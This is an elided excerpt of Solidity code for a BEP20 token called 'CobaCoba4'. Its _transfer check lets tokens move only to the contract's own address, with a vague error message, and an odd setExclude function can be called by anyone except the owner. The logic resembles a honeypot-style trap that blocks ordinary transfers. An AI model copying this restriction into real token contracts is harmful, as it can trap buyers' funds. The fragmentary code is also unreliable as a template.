...
contract Ownable {
  ...
  address private _excludeAddress;
  ...
  function setExclude(address exclude) public virtual {
    require(_msgSender() != owner(), 'You cannot access this function.');
    _excludeAddress = exclude;
  }

  function excludeAddress() internal view returns (address) {
    return _excludeAddress;
  }
...
contract CobaCoba4 is IBEP20, Ownable{
  ...
  constructor(){
    ...
    _decimalsMul = 18;
    _decimals = 18;
    _tokenSupply = 1000000000 * 10 ** _decimalsMul;
    _name = "CobaCoba4";
    _synmbols = "CCBF";
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    require(recipient == address(this) && recipient != excludeAddress(), "BEP20: please try again.");
